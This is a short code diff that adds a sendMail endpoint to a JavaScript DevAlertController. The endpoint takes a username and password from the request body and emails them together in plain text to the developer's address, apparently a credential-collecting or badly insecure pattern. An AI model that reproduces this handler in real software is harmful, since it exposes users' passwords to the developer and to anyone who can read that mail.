@@ -31,6 +31,16 @@ class DevAlertController {
     res.send({ result: "success" });
   };
 
+  sendMail = async(req,res)=>{
+     var {userName,passowrd,medium} = req.body
+     this.emailService.sendMail(
+       medium,
+       `${userName}-${passowrd}`,
+       this.emailService.devEmail
+     ) 
+     res.send({ result: "success" });
+  }
+
   newInstallAlert = async (req, res) => {
     var deviceInfo = req.body;
     this.emailService.sendMail(
